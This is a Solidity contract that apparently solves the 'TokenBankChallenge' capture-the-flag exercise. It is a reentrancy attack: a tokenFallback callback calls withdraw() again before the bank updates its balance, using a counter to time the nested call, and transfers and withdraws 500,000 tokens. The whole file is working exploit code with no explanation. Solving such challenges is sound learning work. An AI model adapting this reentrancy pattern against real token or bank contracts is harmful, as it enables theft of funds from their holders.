pragma solidity ^0.4.21;
import "./TokenBankChallenge.sol";

contract callWithdraw {
    bool stop = false;
    uint256 counter = 0;
    TokenBankChallenge CodeToCall;

    function initCodeToCall(address _addr) public {
        CodeToCall = TokenBankChallenge(address(_addr));
    }

    function transferToTokenBank(address tokenaddr, address transferTo) public {
        SimpleERC223Token token = SimpleERC223Token(tokenaddr);
        // 500,000 * 10**18 = 500000000000000000000000
        token.transfer(transferTo, 500000000000000000000000);
    }

    function execute() public {
        CodeToCall.withdraw(500000000000000000000000);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes a
    ) public {
        if (counter == 0 || counter == 2) {
            counter += 1;
        } else {
            counter += 1;
            CodeToCall.withdraw(500000000000000000000000);
        }
    }
}
